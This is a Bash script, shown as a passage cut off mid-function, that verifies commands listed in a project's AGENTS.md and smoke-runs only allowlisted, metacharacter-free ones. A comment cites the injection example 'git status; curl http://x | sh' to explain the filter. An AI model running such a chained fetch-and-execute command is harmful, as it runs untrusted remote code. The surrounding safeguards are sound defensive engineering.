#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: Netresearch DTT GmbH
# Verify that commands documented in AGENTS.md actually work
# This prevents "command rot" - documented commands that no longer exist
# Requires: Bash 4.0+ (for associative arrays)
set -euo pipefail

# Check Bash version - we need 4.0+ for associative arrays (declare -A)
if ((BASH_VERSINFO[0] < 4)); then
    echo "Error: Bash 4.0+ required (found ${BASH_VERSION})." >&2
    echo "On macOS: brew install bash" >&2
    exit 1
fi

PROJECT_DIR="."
JSON=false
UPDATE_VERIFIED=false
ALLOW_EMPTY=false

# Parse flags. Preserves the original positional semantics (PROJECT_DIR="${1:-.}"):
# the first non-flag argument becomes PROJECT_DIR, defaulting to "." when absent.
while [[ $# -gt 0 ]]; do
    case $1 in
        --json)
            JSON=true
            shift
            ;;
        --update-verified)
            UPDATE_VERIFIED=true
            shift
            ;;
        --allow-empty)
            ALLOW_EMPTY=true
            shift
            ;;
        --help|-h)
            cat <<EOF
Usage: verify-commands.sh [PROJECT_DIR] [OPTIONS]

Verify that commands documented in AGENTS.md actually exist (and optionally run).

Options:
  --json                Emit machine-readable JSON on stdout (human output suppressed)
  --update-verified     On success, record today's date in the "Last verified"
                        marker of AGENTS.md (without it, AGENTS.md is not changed)
  --allow-empty         Exit 0 when AGENTS.md documents no command (default: exit 3)
  --help, -h            Show this help message

Commands are taken from table cells, inline code naming a known tool or a
repo-local script, and the lines of fenced bash/sh/shell/console blocks.
Commands from fenced blocks are examples: they are checked for existence but
never run, also not with SMOKE_TEST=true.

Exit status:
  0  every found command verified or skipped, none failed
  1  a documented command is missing, or the input cannot be read
  3  AGENTS.md documents no command at all (nothing was verified)

Environment variables:
  VERBOSE=true          Show detailed [INFO] output on stderr
  DRY_RUN=true          Skip writing the JSON sidecar and the --update-verified date
  SMOKE_TEST=true       Actually run safe commands (not just check existence)
  TIMEOUT=SECONDS       Per-command timeout for smoke tests (default: 60)
  OUTPUT_JSON=PATH      Sidecar results file (default: PROJECT_DIR/.agents/command-verification.json)

Examples:
  verify-commands.sh .                     # Verify commands in ./AGENTS.md
  verify-commands.sh . --json              # Machine-readable JSON output
EOF
            exit 0
            ;;
        *)
            PROJECT_DIR="$1"
            shift
            ;;
    esac
done

VERBOSE="${VERBOSE:-false}"
DRY_RUN="${DRY_RUN:-false}"
SMOKE_TEST="${SMOKE_TEST:-false}"
TIMEOUT="${TIMEOUT:-60}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
    if [ "$VERBOSE" = true ]; then
        echo -e "[INFO] $*" >&2
    fi
}

error() {
    echo -e "${RED}[ERROR]${NC} $*" >&2
}

success() {
    echo -e "${GREEN}[OK]${NC} $*"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $*"
}

# Resolve the project directory once, before anything is derived from it: a
# relative path joined to AGENTS.md and then used after the cd below would
# point into the project twice (software-factory#131).
if [ ! -d "$PROJECT_DIR" ]; then
    error "project directory not found: $PROJECT_DIR"
    exit 1
fi
PROJECT_DIR="$(cd "$PROJECT_DIR" && pwd -P)"
AGENTS_FILE="$PROJECT_DIR/AGENTS.md"

# The default sidecar lives inside the analysed project, so it is only written
# when its directory is a real directory there (see write_json_results). A
# relative OUTPUT_JSON is relative to where the script was started.
OUTPUT_JSON_IS_DEFAULT=false
[ -z "${OUTPUT_JSON:-}" ] && OUTPUT_JSON_IS_DEFAULT=true
OUTPUT_JSON="${OUTPUT_JSON:-$PROJECT_DIR/.agents/command-verification.json}"
[[ "$OUTPUT_JSON" == /* ]] || OUTPUT_JSON="$PWD/$OUTPUT_JSON"

# Check if AGENTS.md exists and read it once. A read error is a diagnostic, not
# an empty file: an empty inventory would otherwise pass as success.
if [ ! -f "$AGENTS_FILE" ]; then
    error "AGENTS.md not found at $AGENTS_FILE"
    exit 1
fi
if [ ! -r "$AGENTS_FILE" ] || ! AGENTS_CONTENT="$(cat -- "$AGENTS_FILE")"; then
    error "cannot read $AGENTS_FILE"
    exit 1
fi

cd "$PROJECT_DIR"

# In JSON mode, route all human-readable output to /dev/null and reserve the
# original stdout (fd 3) for the single JSON document emitted at the end. This
# keeps --json strictly additive: the default (no-flag) path is untouched.
JSON_CMDS=()
if [[ "$JSON" = true ]]; then
    exec 3>&1 1>/dev/null
fi

echo "Verifying commands in $AGENTS_FILE..."
echo ""

FAILED=0
PASSED=0
SKIPPED=0

# JSON results storage
declare -A COMMAND_RESULTS

# Initialize JSON output directory (always needed for results). A symlinked
# .agents directory in the analysed project would put the sidecar outside it.
SIDECAR_DIR="$(dirname "$OUTPUT_JSON")"
SIDECAR_WRITABLE=true
if [ "$OUTPUT_JSON_IS_DEFAULT" = true ] && [ -L "$SIDECAR_DIR" ]; then
    SIDECAR_WRITABLE=false
else
    mkdir -p "$SIDECAR_DIR"
fi

# Check if a command is safe to execute using a whitelist approach.
# Only commands whose base binary is in the ALLOWED_COMMANDS list are permitted.
# Returns 0 if safe, 1 if not whitelisted.
#
# The command is executed later as a whole string by `bash -c`, so checking the
# first word alone decides nothing: "git status; curl http://x | sh" passes a
# base-command check and then runs both halves (#104). Anything carrying shell
# syntax that could chain, redirect or substitute a second command is therefore
# rejected outright rather than approved on its prefix.
is_safe_command() {
    local cmd="$1"

    # Shell metacharacters: command separators (; & |), substitution ($ `),
    # redirection (< >), grouping ({ } ( )), globs that could expand into
    # further arguments, and newlines. A documented build command needs none
    # of them; anything that does is not verifiable by smoke-running it.
    # A backslash is rejected too: bash -c would remove it, so "-ex\ec" would
    # reach the program as an option the checks below look for by name.
    if [[ "$cmd" == *[\;\&\|\`\$\<\>\{\}\(\)\*\?\!\\$'\n']* ]]; then
        return 1
    fi

    # Whitelist of known safe base commands.
    # These are common build/dev tools that are safe to invoke for verification.
    # Inspection tools whose own options can run a program or write a file are
    # not on it (sed, awk, sort, uniq, less, find, rg, ag, yq, file): each has
    # several such options, and none of them is a build command whose
    # documentation needs verifying.
    local -a ALLOWED_COMMANDS=(
        # Version control (only `git --version`, see has_safe_arguments)
        git
        # File inspection
        ls cat head tail wc stat grep egrep fgrep diff
        # Build tools / package managers
        make go npm yarn pnpm bun composer cargo deno gradle gradlew python python3 pip pip3
        poetry uv pytest php phpunit node ruby bundle gem mvn ant
        # Project-specific binaries (resolved via PATH or relative path)
        vendor/bin
        # Container tools (read-only / informational subcommands only)
        docker podman
        # Linters and formatters
        eslint prettier phpcs phpcbf phpstan psalm rector black flake8 mypy ruff shellcheck
        # Documentation / misc
        # curl/wget are deliberately absent: fetching a URL is not a way to
        # verify that a documented build command works, and they are the two
        # entries that turn an allowlisted base command into an outbound
        # request (#104). Such commands are reported as not smoke-tested.
        jq
        # Testing
        jest vitest mocha
    )

    # Extract the base command (first word), stripping any leading ./
    local base_cmd
    base_cmd=$(echo "$cmd" | awk '{print $1}' | sed 's|^\./||')

    # Allow vendor/bin/* paths
    if [[ "$base_cmd" == vendor/bin/* ]]; then
        return 0
    fi

    # Check against whitelist, then the arguments
    for allowed in "${ALLOWED_COMMANDS[@]}"; do
        if [[ "$base_cmd" == "$allowed" ]]; then
            has_safe_arguments "$base_cmd" "$cmd"
            return
        fi
    done

    # Not in whitelist - reject
    return 1
}

# The first word decides nothing for a tool whose own arguments can run a
# command or write a file. These are allowed only in the forms that do
# neither. Quotes are removed before comparing, as bash -c would remove them.
has_safe_arguments() {
    local base="$1" cmd="$2"
    local -a words=()
    read -ra words <<<"${cmd//[\'\"]/}"
    case "$base" in
        git)
            # Any other git command reads the analysed repository's config,
            # which can name commands git runs (core.fsmonitor, filters,
            # aliases, diff drivers).
            [[ ${#words[@]} -eq 2 && ( "${words[1]}" == "--version" || "${words[1]}" == "version" ) ]]
            return
            ;;
        docker|podman)
            # Informational subcommands only, named first (no global options).
            [[ ${#words[@]} -ge 2 ]] || return 1
            case "${words[1]}" in
                version|--version|info|ps|images) return 0 ;;
                *) return 1 ;;
            esac
            ;;
    esac
    return 0
}

# Portable milliseconds timestamp (works on both GNU and BSD date)
get_time_ms() {
    # Try GNU date with nanoseconds first, fall back to seconds * 1000
    if date +%s%3N 2>/dev/null | grep -qE '^[0-9]+$'; then
        date +%s%3N
    else
        echo $(( $(date +%s) * 1000 ))
    fi
}

# Run a command with timeout and measure duration
smoke_test_command() {
    local cmd="$1"
    local start_time end_time duration_ms exit_code

    # Safety check - skip dangerous commands
    if ! is_safe_command "$cmd"; then
        warn "Not smoke-tested (not on the allowlist, or contains shell syntax): $cmd"
        COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false, "skipped": true, "reason": "safety"}'
        return 1
    fi

    start_time=$(get_time_ms)

    # Run with timeout, capture exit code
    if timeout "${TIMEOUT}s" bash -c "$cmd" > /dev/null 2>&1; then
        exit_code=0
    else
        exit_code=$?
    fi

    end_time=$(get_time_ms)
    duration_ms=$((end_time - start_time))
    # A wall clock that steps back during the run gives a negative difference,
    # which the "duration_ms": [0-9]+ readers below would not match.
    if [[ $duration_ms -lt 0 ]]; then
        duration_ms=0
    fi

    # Store result
    if [ $exit_code -eq 0 ]; then
        COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": true, "duration_ms": '"$duration_ms"'}'
        return 0
    elif [ $exit_code -eq 124 ]; then
        # Timeout
        COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false, "timeout": true, "duration_ms": '"$((TIMEOUT * 1000))"'}'
        return 1
    else
        COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false, "exit_code": '"$exit_code"', "duration_ms": '"$duration_ms"'}'
        return 1
    fi
}

# Write results to JSON file
# The document is built by jq, so any command text is encoded correctly. It is
# written to a temporary file beside the target and renamed into place: a
# symlink at the target is replaced, never written through.
write_json_results() {
    if [ "$SIDECAR_WRITABLE" != true ]; then
        warn "Not writing $OUTPUT_JSON: $SIDECAR_DIR is a symlink"
        return 0
    fi

    local timestamp commands='{}' cmd tmp
    # Portable ISO 8601 timestamp (works on both GNU and BSD date)
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    for cmd in "${!COMMAND_RESULTS[@]}"; do
        commands=$(jq -c --arg k "$cmd" --argjson v "${COMMAND_RESULTS[$cmd]}" '. + {($k): $v}' <<<"$commands")
    done

    tmp=$(mktemp "$SIDECAR_DIR/.command-verification.XXXXXX")
    jq -n --arg t "$timestamp" --arg smoke "$SMOKE_TEST" --argjson c "$commands" \
        '{verified_at: $t, smoke_tested: ($smoke == "true"), commands: $c}' > "$tmp"
    [ -L "$OUTPUT_JSON" ] && rm -f "$OUTPUT_JSON"
    mv -f "$tmp" "$OUTPUT_JSON"

    log "Results written to $OUTPUT_JSON"
}

# The text of AGENTS.md outside fenced code blocks.
outside_fences() {
    awk '
        /^[ \t]*(```|~~~)/ { in_fence = !in_fence; next }
        !in_fence { print }
    ' <<<"$AGENTS_CONTENT"
}

# The lines of fenced bash/sh/shell/console/zsh blocks, one command each:
# backslash continuations joined, a "$ " prompt and trailing "# comments"
# removed, blank and comment lines dropped.
fenced_shell_lines() {
    awk '
        !in_fence && /^[ \t]*(```|~~~)[ \t]*(bash|sh|shell|console|zsh|shell-session)[ \t]*$/ { in_fence = 1; shell = 1; next }
        !in_fence && /^[ \t]*(```|~~~)/ { in_fence = 1; shell = 0; next }
        in_fence && /^[ \t]*(```|~~~)[ \t]*$/ { in_fence = 0; shell = 0; acc = ""; next }
        in_fence && shell {
            line = $0
            if (line ~ /\\$/) { acc = acc substr(line, 1, length(line) - 1) " "; next }
            line = acc line; acc = ""
            sub(/^[ \t]+/, "", line)
            sub(/^\$[ \t]+/, "", line)
            if (line ~ /^#/) next
            sub(/[ \t]+#.*$/, "", line)
            sub(/[ \t]+$/, "", line)
            gsub(/[ \t]+/, " ", line)
            if (line != "") print line
        }
    ' <<<"$AGENTS_CONTENT"
}

# Is <word> a relative path to a script of this project? It must stay inside
# the project; it need not exist, so that a script the instructions name but
# the repository lost is reported instead of dropped.
is_repo_local_path() {
    local word="$1"
    [[ "$word" == */* && "$word" != /* && "$word" != vendor/bin/* ]] || return 1
    [[ "$word" =~ ^(\./)?[A-Za-z0-9_.-]+(/[A-Za-z0-9_.-]+)+$ ]] || return 1
    [[ "$word" != *..* ]] || return 1
    if [ -f "$word" ] && [ -x "$word" ]; then
        return 0
    fi
    [[ "$word" =~ \.(sh|bash|py|php|pl|rb|js|mjs|ts)$ ]]
}

# The command word of <cmd>: leading VAR=value assignments skipped.
command_word() {
    local rest="$1"
    while [[ "$rest" =~ ^[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+(.*)$ ]]; do
        rest="${BASH_REMATCH[1]}"
    done
    printf '%s\n' "${rest%% *}"
}

# Is a single backticked word a path rather than a command (a file map, a
# directory table, a file named in prose)? A directory, an existing file that
# is not executable, and a missing file that is not a script are paths. A
# missing script stays a command, so that a lost script is reported.
is_path_cell() {
    local cell="$1"
    [[ "$cell" == *[[:space:]]* ]] && return 1
    [[ "$cell" == */ ]] && return 0
    [ -d "$cell" ] && return 0
    [ -f "$cell" ] && [ ! -x "$cell" ] && return 0
    if [ ! -e "$cell" ] && [[ "$cell" == */* ]] && [[ ! "$cell" =~ \.(sh|bash|py|php|pl|rb|js|mjs|ts)$ ]]; then
        return 0
    fi
    return 1
}

# Print "<source><TAB><command>" for every command documented in AGENTS.md.
# <source> is "inline" (a table cell or inline code) or "fenced" (a line of a
# fenced shell block). A command found both ways is reported once, as inline.
extract_commands() {
    local text cell span word bt=$'\x60'
    text="$(outside_fences)"
    {
        # Tables with backticks (| `command` | format); paths are not commands.
        # shellcheck disable=SC2016  # grep/sed pattern: backticks are literal.
        while IFS= read -r cell; do
            [[ "$cell" =~ ^[[:space:]]*$ ]] && continue
            is_path_cell "$cell" && continue
            printf 'inline\t%s\n' "$cell"
        done < <(grep -oE '\| `[^`]+`' <<<"$text" | sed 's/| `//;s/`$//' || true)

        # Tables without backticks in the Commands section, e.g.
        # "| Lint | vendor/bin/php-cs-fixer fix --dry-run |": 3rd column,
        # header and separator rows skipped, time estimates dropped.
        sed -n '/^## Commands/,/^##/p' <<<"$text" | \
            grep -E '^\|' | \
            tail -n +3 | \
            cut -d'|' -f3 | \
            sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
            grep -v '^$' | \
            grep -v '^~' | \
            grep -v '^`' | \
            sed 's/^/inline\t/' || true

        # Inline code naming a known tool or a repo-local script, also after
        # VAR=value assignments.
        # shellcheck disable=SC2016  # grep pattern: backticks are literal.
        while IFS= read -r span; do
            span="${span#"$bt"}"
            span="${span%"$bt"}"
            word="$(command_word "$span")"
            case "$word" in
                npm|yarn|pnpm|bun|make|go|composer|cargo|pytest|python|python3|pip|poetry|uv|deno|gradle|php)
                    [[ "$span" == *" "* ]] && printf 'inline\t%s\n' "$span"
                    ;;
                vendor/bin/*)
                    printf 'inline\t%s\n' "$span"
                    ;;
                *)
                    is_repo_local_path "$word" || continue
                    is_path_cell "$span" && continue
                    printf 'inline\t%s\n' "$span"
                    ;;
            esac
        done < <(grep -oE '`[^`]+`' <<<"$text" || true)

        fenced_shell_lines | sed 's/^/fenced\t/'
    } | awk '
        {
            t = index($0, "\t"); kind = substr($0, 1, t - 1); c = substr($0, t + 1)
            if (!(c in src)) { order[++n] = c; src[c] = kind; next }
            if (kind == "inline") src[c] = "inline"
        }
        END { for (i = 1; i <= n; i++) printf "%s\t%s\n", src[order[i]], order[i] }
    '
}

# Print the makefile make would read in the current directory and every file
# it includes, without running make: even `make -n` expands $(shell ...) while
# it parses, which would run the project's commands just to look up a target.
# An include naming a variable needs make to expand it and is skipped; globs
# are expanded; a file outside the project or a symlinked one is ignored.
makefile_files() {
    local first="" f word match real root
    for f in GNUmakefile makefile Makefile; do
        if [ -f "$f" ]; then first="$f"; break; fi
    done
    [ -n "$first" ] || return 0
    root="$(pwd -P)"
    local -a queue=("$first")
    local -A seen=()
    while [ "${#queue[@]}" -gt 0 ]; do
        f="${queue[0]}"
        queue=("${queue[@]:1}")
        # A symlinked makefile is skipped; the directory is resolved with
        # cd/pwd -P because macOS realpath has no -e.
        [ -L "$f" ] && continue
        [ -f "$f" ] || continue
        real="$(cd "$(dirname "$f")" 2>/dev/null && pwd -P)/$(basename "$f")" || continue
        [[ "$real" == "$root"/* ]] || continue
        [ -n "${seen[$real]:-}" ] && continue
        seen[$real]=1
        printf '%s\n' "$f"
        while IFS= read -r word; do
            [[ "$word" == *'$'* ]] && continue
            while IFS= read -r match; do
                [ -n "$match" ] && queue+=("$match")
            done < <(compgen -G "$word" || true)
        done < <(awk '/^[ \t]*(-|s)?include[ \t]/ {
                     sub(/^[ \t]*(-|s)?include[ \t]+/, ""); sub(/[ \t]*#.*/, "")
                     n = split($0, w, /[ \t]+/)
                     for (i = 1; i <= n; i++) if (w[i] != "") print w[i]
                 }' "$f")
    done
}

# Print the targets of the makefile and its includes, read as text: explicit
# targets, names listed as .PHONY prerequisites (make accepts those), and
# pattern rules such as plan-% (matched by makefile_has_target). Variable
# assignments (VAR = x, VAR := x, VAR ::= x, export VAR := x), recipe lines,
# define blocks and other special targets are not targets.
makefile_targets() {
    local f
    while IFS= read -r f; do
        awk '
            /^define[ \t]/ || /^define$/ { in_define = 1; next }
            in_define { if ($0 ~ /^endef/) in_define = 0; next }
            /^\t/ || /^[ \t]*#/ { next }
            {
                line = $0
                sub(/[ \t]*#.*/, "", line)
                p = index(line, ":")
                if (p == 0) next
                head = substr(line, 1, p - 1)
                rest = substr(line, p + 1)
                if (rest ~ /^:?=/ || head ~ /[=$]/) next
                if (head ~ /^[ \t]*\.PHONY[ \t]*$/) {
                    n = split(rest, t, /[ \t]+/)
                    for (i = 1; i <= n; i++) if (t[i] != "" && t[i] !~ /\$/) print t[i]
                    next
                }
                n = split(head, t, /[ \t]+/)
                for (i = 1; i <= n; i++)
                    if (t[i] != "" && t[i] !~ /^\./) print t[i]
            }' "$f"
    done < <(makefile_files)
}

# Is <target> a target of the makefile in the current directory, by name or
# through a pattern rule?
makefile_has_target() {
    local target="$1" targets t
    targets="$(makefile_targets)"
    grep -qxF -- "$target" <<<"$targets" && return 0
    while IFS= read -r t; do
        [[ "$t" == *%* ]] || continue
        # shellcheck disable=SC2053  # the pattern is meant to match as a glob
        [[ "$target" == ${t//%/*} ]] && return 0
    done <<<"$targets"
    return 1
}

# Verify a single command exists (not that it succeeds, just that it's callable)
verify_command() {
    local cmd="$1"
    local base_cmd

    # The base command: the first word after any VAR=value assignments
    base_cmd="$(command_word "$cmd")"

    # Skip placeholders
    if [[ "$cmd" == *"<"* ]] || [[ "$cmd" == *"{{{"* ]]; then
        log "Skipping placeholder: $cmd"
        ((SKIPPED+=1))
        return 0
    fi

    # Skip if it's just a flag or option
    if [[ "$base_cmd" == -* ]]; then
        return 0
    fi

    log "Checking: $cmd"

    # Check different command types
    case "$base_cmd" in
        npm|yarn|pnpm|bun)
            # Check if package.json script exists
            local script="${cmd#* }"
            script="${script#run }"
            script="${script%% *}"
            if [ -f "package.json" ]; then
                local script_exists=false
                if jq -e ".scripts[\"$script\"]" package.json > /dev/null 2>&1; then
                    script_exists=true
                elif [[ "$script" =~ ^(install|test|build|start|run)$ ]]; then
                    script_exists=true
                fi

                if [ "$script_exists" = true ]; then
                    if [ "$SMOKE_TEST" = true ]; then
                        # For test commands, only verify they start (dry-run if available)
                        local test_cmd="$cmd"
                        if [[ "$script" == "test" ]]; then
                            # Try to use --help or --dry-run to avoid full test run
                            test_cmd="$base_cmd run $script -- --help 2>/dev/null || $base_cmd run $script --dry-run 2>/dev/null || true"
                        fi
                        if smoke_test_command "$test_cmd"; then
                            local duration="${COMMAND_RESULTS[$cmd]}"
                            duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                            success "$base_cmd script works: $script (~${duration}ms)"
                            ((PASSED+=1))
                        else
                            warn "$base_cmd script exists but smoke test failed: $script"
                            COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false}'
                            ((SKIPPED+=1))
                        fi
                    else
                        success "$base_cmd script exists: $script"
                        COMMAND_RESULTS["$cmd"]='{"exists": true}'
                        ((PASSED+=1))
                    fi
                else
                    warn "$base_cmd script not found: $script (in $cmd)"
                    COMMAND_RESULTS["$cmd"]='{"exists": false}'
                    ((SKIPPED+=1))
                fi
            else
                warn "No package.json found for: $cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        make)
            # Check if Makefile target exists
            local target="${cmd#make }"
            target="${target%% *}"
            if [ -f "Makefile" ] || [ -f "makefile" ] || [ -f "GNUmakefile" ]; then
                if makefile_has_target "$target"; then
                    if [ "$SMOKE_TEST" = true ]; then
                        # Use make -n (dry run) for smoke test to avoid side effects
                        if smoke_test_command "make -n $target"; then
                            local duration="${COMMAND_RESULTS[$cmd]}"
                            duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                            success "make target works: $target (~${duration}ms)"
                            ((PASSED+=1))
                        else
                            warn "make target exists but dry-run failed: $target"
                            COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false}'
                            ((SKIPPED+=1))
                        fi
                    else
                        success "make target exists: $target"
                        COMMAND_RESULTS["$cmd"]='{"exists": true}'
                        ((PASSED+=1))
                    fi
                else
                    error "make target not found: $target"
                    COMMAND_RESULTS["$cmd"]='{"exists": false}'
                    ((FAILED+=1))
                fi
            else
                warn "No Makefile found for: $cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        composer)
            # Check if composer script exists, in the directory a
            # --working-dir / -d option names
            local script="" composer_dir="." word expect_dir=false
            local -a cwords=()
            read -ra cwords <<<"${cmd#*composer }"
            for word in "${cwords[@]}"; do
                if [ "$expect_dir" = true ]; then composer_dir="$word"; expect_dir=false; continue; fi
                case "$word" in
                    --working-dir=*) composer_dir="${word#--working-dir=}" ;;
                    --working-dir|-d) expect_dir=true ;;
                    -d*) composer_dir="${word#-d}" ;;
                    -*) ;;
                    *) script="$word"; break ;;
                esac
            done
            if [ -f "$composer_dir/composer.json" ]; then
                local script_exists=false
                if [[ "$script" =~ ^(install|update|require|remove|dump-autoload)$ ]]; then
                    script_exists=true
                elif jq -e --arg s "$script" '.scripts[$s]' "$composer_dir/composer.json" > /dev/null 2>&1; then
                    script_exists=true
                fi

                if [ "$script_exists" = true ]; then
                    if [ "$SMOKE_TEST" = true ]; then
                        # For composer scripts, try --dry-run or --help
                        local test_cmd="$cmd"
                        if [[ "$script" =~ ^(install|update)$ ]]; then
                            test_cmd="composer $script --dry-run 2>/dev/null || true"
                        fi
                        if smoke_test_command "$test_cmd"; then
                            local duration="${COMMAND_RESULTS[$cmd]}"
                            duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                            success "composer script works: $script (~${duration}ms)"
                            ((PASSED+=1))
                        else
                            warn "composer script exists but smoke test failed: $script"
                            COMMAND_RESULTS["$cmd"]='{"exists": true, "runs": false}'
                            ((SKIPPED+=1))
                        fi
                    else
                        success "composer script exists: $script"
                        COMMAND_RESULTS["$cmd"]='{"exists": true}'
                        ((PASSED+=1))
                    fi
                else
                    warn "composer script not found: $script"
                    COMMAND_RESULTS["$cmd"]='{"exists": false}'
                    ((SKIPPED+=1))
                fi
            else
                warn "No composer.json found for: $cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        python|python3|pip|pip3)
            # Python commands
            if command -v "$base_cmd" > /dev/null 2>&1; then
                success "Python command available: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "Python command not found: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        poetry)
            # Poetry package manager
            if command -v poetry > /dev/null 2>&1; then
                local subcmd="${cmd#poetry }"
                subcmd="${subcmd%% *}"
                if [[ "$subcmd" =~ ^(install|add|remove|update|build|publish|run|shell)$ ]]; then
                    success "poetry command: $subcmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                else
                    # Check if it's a custom script
                    if [ -f "pyproject.toml" ] && grep -q "\[tool.poetry.scripts\]" pyproject.toml 2>/dev/null; then
                        success "poetry command available"
                        COMMAND_RESULTS["$cmd"]='{"exists": true}'
                        ((PASSED+=1))
                    else
                        warn "poetry script not found: $subcmd"
                        COMMAND_RESULTS["$cmd"]='{"exists": false}'
                        ((SKIPPED+=1))
                    fi
                fi
            else
                warn "poetry not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        uv)
            # uv package manager
            if command -v uv > /dev/null 2>&1; then
                success "uv command available"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "uv not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        pytest)
            # pytest test runner
            if command -v pytest > /dev/null 2>&1; then
                success "pytest available"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "pytest not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        cargo)
            # Rust cargo
            if command -v cargo > /dev/null 2>&1; then
                success "cargo command available"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "cargo not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        deno)
            # Deno runtime
            if command -v deno > /dev/null 2>&1; then
                success "deno command available"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "deno not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        gradle|gradlew|./gradlew)
            # Gradle build tool
            if [ -f "gradlew" ] || [ -f "build.gradle" ] || [ -f "build.gradle.kts" ]; then
                success "gradle project detected"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            elif command -v gradle > /dev/null 2>&1; then
                success "gradle command available"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "gradle not found"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        go)
            # Go commands are generally available if go is installed
            if command -v go > /dev/null 2>&1; then
                if [ "$SMOKE_TEST" = true ]; then
                    if smoke_test_command "$cmd"; then
                        local duration="${COMMAND_RESULTS[$cmd]}"
                        duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                        success "go command ran successfully (~${duration}ms)"
                        ((PASSED+=1))
                    else
                        error "go command failed: $cmd"
                        ((FAILED+=1))
                    fi
                else
                    success "go command available"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                fi
            else
                error "go not installed"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((FAILED+=1))
            fi
            ;;

        vendor/bin/*)
            # PHP vendor binary
            if [ -f "$base_cmd" ]; then
                if [ "$SMOKE_TEST" = true ]; then
                    # For test commands, run with --help to avoid actually running tests
                    local test_cmd="$cmd"
                    if [[ "$cmd" == *"phpunit"* ]] && [[ "$cmd" != *"--help"* ]]; then
                        test_cmd="$base_cmd --help"
                    fi
                    if smoke_test_command "$test_cmd"; then
                        local duration="${COMMAND_RESULTS[$cmd]}"
                        duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                        success "vendor binary works (~${duration}ms)"
                        ((PASSED+=1))
                    else
                        warn "vendor binary exists but failed: $cmd"
                        ((SKIPPED+=1))
                    fi
                else
                    success "vendor binary exists: $base_cmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                fi
            else
                error "vendor binary not found: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((FAILED+=1))
            fi
            ;;

        sh|bash)
            # A repo-local script run through the shell: "sh Build/x.sh"
            local script_path
            script_path="$(awk '{for (i = 2; i <= NF; i++) if ($i !~ /^-/) { print $i; exit }}' <<<"${cmd#*"$base_cmd"}")"
            if [ -n "$script_path" ] && is_repo_local_path "$script_path"; then
                if [ -f "$script_path" ]; then
                    success "repo-local command exists: $script_path"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                else
                    error "repo-local command not found: $script_path"
                    COMMAND_RESULTS["$cmd"]='{"exists": false}'
                    ((FAILED+=1))
                fi
            elif command -v "$base_cmd" > /dev/null 2>&1; then
                success "command exists: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": true}'
                ((PASSED+=1))
            else
                warn "command not in PATH: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;

        *)
            # A repo-local script: a relative path inside the project. Its
            # existence is checked; it is never run (not on the allowlist).
            if is_repo_local_path "$base_cmd"; then
                if [ -f "$base_cmd" ] && [ -x "$base_cmd" ]; then
                    success "repo-local command exists: $base_cmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                elif [ -f "$base_cmd" ]; then
                    warn "repo-local script is not executable: $base_cmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": true, "executable": false}'
                    ((SKIPPED+=1))
                else
                    error "repo-local command not found: $base_cmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": false}'
